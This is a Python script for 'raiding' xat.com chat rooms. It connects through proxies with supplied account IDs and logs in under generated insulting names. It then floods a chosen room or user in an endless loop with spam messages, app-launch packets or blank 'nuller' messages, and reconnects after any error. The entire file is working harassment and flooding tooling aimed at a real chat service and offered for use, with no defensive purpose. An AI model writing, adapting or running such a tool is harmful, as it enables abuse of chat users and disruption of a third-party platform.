class raidLib:
	'''
		Rm == Chat
		Mt == Method
		Ms == Message
		Rt == Raid Target[ID]
	'''

	raidData = {
		'rm': input('Chat -> '),
		'mt': 3,
		'ms': ' ',
		'rt': 0 
	}

	Chat 	= get('http://xat.com/web_gear/chat/roomid.php?d=' + str(raidData['rm'])).json()
	liveIP 	= get('https://xat.com/web_gear/chat/ip3.php').json()
	liveIP 	= liveIP['E1'][1][0].split(':')

	print('[XAT][init]', dumps(raidData))
	print(liveIP)
	
	def __init__(self, Proxy, ID):
		self.raidConfig = {
			'user': {
				'name': 	self.loadInsult(),
				'avatar': 	rand(1, 1759)
			},
			'server': [str(self.liveIP[0]), int(self.liveIP[1])],
			'proxy': [Proxy.split(':')]
		}

		self.ID = ID.strip('\r\n').split('&')

		self.buildRaid()

	def buildRaid(self):
		try:
			setdefaultproxy(PROXY_TYPE_HTTP, self.raidConfig['proxy'][0][0], int(self.raidConfig['proxy'][0][1]), True, self.raidConfig['proxy'][0][2], self.raidConfig['proxy'][0][3])

			self.xSock = socksocket(AF_INET, SOCK_STREAM, SOL_TCP)
			self.xSock.connect((self.raidConfig['server'][0], self.raidConfig['server'][1]))

			self.xSock.send(self.build('y', [['r', self.Chat['id']], ['v', '0'], ['u', self.ID[1]]]))
			xatAttr = xParse(self.xSock.recv(2048).decode('utf-8', 'ignore').strip('\0')).attrib

			self.xSock.send(self.buildJ2(xatAttr['i']))
			xatData = self.xSock.recv(4068).decode('utf-8', 'ignore')

			# If you want to debug, remove the #.
			#print(xatAttr)

			while True:
				self.raidMethod(self.raidData['mt'])

		except:
			self.buildRaid()

	def raidMethod(self, Method):
		if int(Method) not in [0, 1, 2, 3]: return

		if Method == 0:
			''' PC/PM Raid '''
			build = [
				['d', str(self.raidData['rt'])],
				['u', str(self.ID[1])],
				['t', str(self.raidData['ms'])],
				['o', ''],
				['s', str(rand(1, 2))]
			]
			
			sleep(0.5)			
			return self.xSock.send(self.build('z', build))
		elif Method == 1:
			''' Appfuck '''
			liss = [30008, 10001, 20010, 20047]

			build = [['i', str(choice(liss))], ['u', str(self.ID[1])], ['t', '']]

			sleep(0.5)
			return self.xSock.send(self.build('x', build))
		elif Method == 2:
			''' Main Raid '''
			build = [['u', str(self.ID[1])], ['t', str(self.raidData['ms'])]]
			
			sleep(0.5)
			return self.xSock.send(self.build('m', build))
		else:
			''' Chat Nuller '''
			build = [['u', str(self.ID[1])], ['t', '/']]
			
			sleep(0.5)
			return self.xSock.send(self.build('m', build))

	def build(self, tag, _dict):
		return bytes('<' + tag + ' ' + (' '.join([_list[0] + '="' + _list[1] + '"' for _list in _dict])) + ' />\0', encoding = 'utf-8')

	def buildJ2(self, y):
		j2 = [
			['cb', '0'],
			['Y', '2'],
			['l5', 'per'],
			['l4', str(rand(100, 200))],
			['l3', str(rand(100, 200))],
			['l2', '0'],
			['y', str(y)],
			['k', str(self.ID[2])],
			['k3', '0'],
			['z', 'm1.59,3'],
			['p', '300'],
			['c', str(self.Chat['id'])],
			['f', '2'],
			['u', str(self.ID[1])],
			['n', str(self.raidConfig['user']['name'])],
			['a', str(self.raidConfig['user']['avatar'])],
			['h', ''],
			['v', '1']
		]

		return self.build('j2', j2)

	def loadInsult(self):
		fh = open('_lib/_inc/Insults.txt', 'r')
		self.insult = {'adj': fh.readline().split(','), 'noun': fh.readline().split(',')}
		fh.close()

		return ' '.join([self.insult['adj'][int(random() * len(self.insult['adj']) - 1)] for i in range(0, 8)]) + ' ' + self.insult['noun'][int(random() * len(self.insult['noun']) - 1)]